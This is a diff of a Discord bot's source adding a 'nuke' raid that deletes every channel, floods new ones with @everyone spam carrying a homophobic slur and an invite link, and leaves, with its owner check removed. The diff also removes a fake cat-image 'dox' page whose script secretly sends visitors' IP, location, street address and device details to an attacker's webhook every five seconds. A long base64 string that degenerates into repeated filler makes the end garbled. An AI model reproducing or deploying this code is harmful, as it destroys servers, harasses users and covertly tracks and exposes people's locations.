@@ -4,7 +4,6 @@ const express = require('express');
 const app = express();
 
 const TOKEN = process.env.TOKEN;
-const OWNER_ID = process.env.OWNER_ID;
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
 const PORT = process.env.PORT || 3000;
@@ -20,7 +19,6 @@ const links = new Map();
 const startTime = Date.now();
 let nukeRunning = false;
 let nukeGuildId = null;
-let activeChannels = [];
 
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
@@ -40,8 +38,8 @@ async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
         { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
-        { name: 'nuke', description: '[OWNER ONLY] Ultra-fast infinite nuke' },
-        { name: 'stop', description: '[OWNER ONLY] Stop the nuke' },
+        { name: 'nuke', description: 'Delete all channels, create 20, spam 100 messages each, leave' },
+        { name: 'stop', description: 'Stop the nuke' },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
         { name: 'ping', description: 'Check bot latency' },
@@ -86,13 +84,6 @@ client.on('interactionCreate', async (interaction) => {
         const { commandName, options, user, member, guild, channel } = interaction;
         console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);
 
-        // ---- OWNER CHECK (NUKE, STOP) ----
-        if (commandName === 'nuke' || commandName === 'stop') {
-            if (!OWNER_ID || user.id !== OWNER_ID) {
-                return interaction.editReply('❌ You are not authorized to use this command.');
-            }
-        }
-
         // ---- STOP ----
         if (commandName === 'stop') {
             if (!nukeRunning) {
@@ -100,7 +91,6 @@ client.on('interactionCreate', async (interaction) => {
             }
             nukeRunning = false;
             nukeGuildId = null;
-            activeChannels = [];
             await interaction.editReply('⏹️ **Nuke stopped.**');
             return;
         }
@@ -137,7 +127,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- NUKE ----
+        // ---- NUKE (Fixed) ----
         if (commandName === 'nuke') {
             if (nukeRunning) {
                 return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
@@ -148,46 +138,41 @@ client.on('interactionCreate', async (interaction) => {
 
             nukeRunning = true;
             nukeGuildId = guild.id;
-            activeChannels = [];
 
-            await interaction.editReply('🚀 **Ultra-fast nuke started!** Use `/stop` to stop it.');
+            await interaction.editReply('🚀 **Nuke started!** Use `/stop` to stop it.');
 
+            // Delete all channels
             await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
 
+            // Create 20 new channels
+            const newChannels = await Promise.all(
+                Array.from({ length: 20 }, () =>
+                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)
+                )
+            );
+            const valid = newChannels.filter(c => c !== null);
+
+            // Build the spam message
             const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
             const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
-
             const line = variants[0];
             let big = `@everyone ${line}\n`;
             while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
             big += `\n${inviteLine}`;
             const spamMessage = big.slice(0, 2000);
 
-            let channelIndex = 0;
-            while (nukeRunning && nukeGuildId === guild.id) {
-                const batchSize = 10;
-                const createPromises = [];
-                for (let i = 0; i < batchSize; i++) {
-                    if (!nukeRunning) break;
-                    createPromises.push(
-                        guild.channels.create({ name: 'pulse', type: ChannelType.GuildText })
-                            .then(c => {
-                                if (c) {
-                                    activeChannels.push(c);
-                                    c.send(spamMessage).catch(() => {});
-                                    spamChannelContinuously(c);
-                                }
-                                return c;
-                            })
-                            .catch(() => null)
-                    );
-                }
-                await Promise.all(createPromises);
-                channelIndex++;
+            // Send 100 messages to each channel
+            for (let i = 0; i < 100; i++) {
+                if (!nukeRunning) break;
+                await Promise.all(valid.map(c => c.send(spamMessage).catch(() => {})));
+                await new Promise(r => setTimeout(r, 50)); // small delay to avoid rate limit
             }
 
+            // Leave the server
+            await guild.leave();
+
             nukeRunning = false;
-            activeChannels = [];
+            await interaction.editReply('✅ **Nuke complete.** Left the server.');
             return;
         }
 
@@ -335,281 +320,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-async function spamChannelContinuously(channel) {
-    const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
-    const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
-    let index = 0;
-
-    while (nukeRunning && activeChannels.includes(channel)) {
-        const line = variants[index % variants.length];
-        let big = `@everyone ${line}\n`;
-        while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
-        big += `\n${inviteLine}`;
-        const msg = big.slice(0, 2000);
-
-        await channel.send(msg).catch(() => {});
-        index++;
-    }
-}
-
+// ---- DOX HTML ----
 function generateDoxHTML(webhook) {
-    // Direct URL to the cat image
-    const imageUrl = 'https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg';
-
-    return `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Cat</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #0b0b12;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: 'Segoe UI', sans-serif;
-        }
-        .container {
-            text-align: center;
-        }
-        .container img {
-            max-width: 90%;
-            max-height: 80vh;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            border: 1px solid rgba(255,255,255,0.06);
-        }
-        .caption {
-            color: #555;
-            font-size: 14px;
-            margin-top: 12px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="${imageUrl}" alt="Cat" />
-        <div class="caption">Loading...</div>
-    </div>
-
-<script>
-const WEBHOOK_URL = "${webhook}";
-const IMAGE_URL = "${imageUrl}";
-
-let messageId = null;
-
-async function sendInitialEmbed() {
-    try {
-        const ip = await getIPData();
-        const battery = await getBattery();
-        const vpn = detectVPN(ip);
-        const now = new Date();
-        const timestamp = now.toISOString();
-        const localTime = now.toString();
-
-        let address = "N/A";
-        let lat = ip.lat || "N/A";
-        let lon = ip.lon || "N/A";
-        if (lat !== "N/A" && lon !== "N/A") {
-            const addr = await reverseGeocode(lat, lon);
-            if (addr) address = addr;
-        }
-
-        const ua = navigator.userAgent;
-        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
-        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
-        const device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
-
-        const fields = [
-            { name: "📍 Address", value: address, inline: false },
-            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
-            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
-            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
-            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
-            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
-            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
-            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
-            { name: "🔋 Battery", value: battery ? battery.level + "%" + (battery.charging ? " (Charging)" : " (Not Charging)") : "N/A", inline: true },
-            { name: "🛡️ VPN / Proxy", value: vpn.detected ? "✅ Likely" : "❌ No", inline: true },
-            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },
-            { name: "🧠 Browser", value: browser, inline: true },
-            { name: "💻 OS", value: os, inline: true },
-            { name: "🖥️ Device", value: device, inline: true },
-            { name: "⏰ Local Time", value: localTime, inline: false },
-            { name: "📅 Timestamp", value: timestamp, inline: false }
-        ];
-
-        const embed = {
-            title: "☠️ Doxxed (Live)",
-            color: 0xFF0000,
-            fields: fields,
-            footer: { text: "Updated at " + timestamp }
-        };
-
-        const res = await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [embed] })
-        });
-        const data = await res.json();
-        messageId = data.id;
-
-    } catch (err) {
-        console.error("Initial embed failed:", err);
-    }
-}
-
-async function updateEmbed() {
-    if (!messageId) return;
-
-    try {
-        const ip = await getIPData();
-        const battery = await getBattery();
-        const vpn = detectVPN(ip);
-        const now = new Date();
-        const timestamp = now.toISOString();
-        const localTime = now.toString();
-
-        let address = "N/A";
-        let lat = ip.lat || "N/A";
-        let lon = ip.lon || "N/A";
-        if (lat !== "N/A" && lon !== "N/A") {
-            const addr = await reverseGeocode(lat, lon);
-            if (addr) address = addr;
-        }
-
-        const ua = navigator.userAgent;
-        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
-        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
-        const device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
-
-        const fields = [
-            { name: "📍 Address", value: address, inline: false },
-            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
-            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
-            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
-            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
-            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
-            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
-            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
-            { name: "🔋 Battery", value: battery ? battery.level + "%" + (battery.charging ? " (Charging)" : " (Not Charging)") : "N/A", inline: true },
-            { name: "🛡️ VPN / Proxy", value: vpn.detected ? "✅ Likely" : "❌ No", inline: true },
-            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },
-            { name: "🧠 Browser", value: browser, inline: true },
-            { name: "💻 OS", value: os, inline: true },
-            { name: "🖥️ Device", value: device, inline: true },
-            { name: "⏰ Local Time", value: localTime, inline: false },
-            { name: "📅 Timestamp", value: timestamp, inline: false }
-        ];
-
-        const embed = {
-            title: "☠️ Doxxed (Live)",
-            color: 0xFF0000,
-            fields: fields,
-            footer: { text: "Updated at " + timestamp }
-        };
-
-        await fetch(WEBHOOK_URL + '/messages/' + messageId, {
-            method: "PATCH",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [embed] })
-        });
-
-    } catch (err) {
-        console.error("Update failed:", err);
-    }
-}
-
-// ---- HELPERS ----
-async function getIPData() {
-    const apis = [
-        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
-        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },
-        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) }
-    ];
-    for (const api of apis) {
-        try {
-            const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 5000);
-            const res = await fetch(api.url, { signal: controller.signal });
-            clearTimeout(timeout);
-            const data = await res.json();
-            if (data.ip) {
-                const result = api.parse(data);
-                if (result.ip) return result;
-            }
-        } catch (e) {}
-    }
-    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };
-}
-
-async function getBattery() {
-    try {
-        const b = await navigator.getBattery();
-        return {
-            level: Math.round(b.level * 100),
-            charging: b.charging
-        };
-    } catch {
-        return null;
-    }
-}
-
-function detectVPN(ipData) {
-    const signals = [];
-    const vpnKeywords = ['vpn', 'proxy', 'cloudflare', 'aws', 'amazon', 'digitalocean', 'vultr', 'linode', 'hetzner', 'ovh', 'm247', 'psychz', 'hostinger', 'namecheap', 'contabo', 'server', 'hosting', 'dedicated'];
-    const isp = (ipData.isp || '').toLowerCase();
-    const asn = (ipData.asn || '').toLowerCase();
-    if (vpnKeywords.some(k => isp.includes(k) || asn.includes(k))) {
-        signals.push('ISP/ASN matches VPN/hosting provider');
-    }
-    try {
-        const conn = navigator.connection || navigator.mozConnection;
-        if (conn && conn.type === 'vpn') {
-            signals.push('Connection type is "vpn"');
-        }
-    } catch {}
-    if (ipData.timezone && ipData.timezone !== 'N/A') {
-        const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        if (browserTz && ipData.timezone !== browserTz) {
-            signals.push('Timezone mismatch (IP: ' + ipData.timezone + ' vs Browser: ' + browserTz + ')');
-        }
-    }
-    return {
-        detected: signals.length > 0,
-        signals: signals,
-        score: signals.length
-    };
-}
-
-async function reverseGeocode(lat, lon) {
-    try {
-        const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");
-        const data = await res.json();
-        if (data && data.display_name) return data.display_name;
-    } catch (e) {}
-    return null;
-}
-
-// ---- RUN ----
-sendInitialEmbed();
-setInterval(updateEmbed, 5000);
-
-document.querySelector('.caption').textContent = 'Image loaded successfully.';
-<\/script>
-</body>
-</html>`;
-}
-
-setInterval(() => {
-    const keys = Array.from(links.keys());
-    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
-}, 60000);
-
-process.on('uncaughtException', console.error);
-process.on('unhandledRejection', console.error);
-
-client.login(TOKEN);
+    const catBase64 = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgICAgJCAkKCgkNDQ0NDRgODQ0NDRoTEhMSEhM0GxgXGxgXGzQkISUkJCEkNDQ1NTQ0N0dHR0dHR0dHR0dHR0f/wAALCAEAAgAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAREAAR
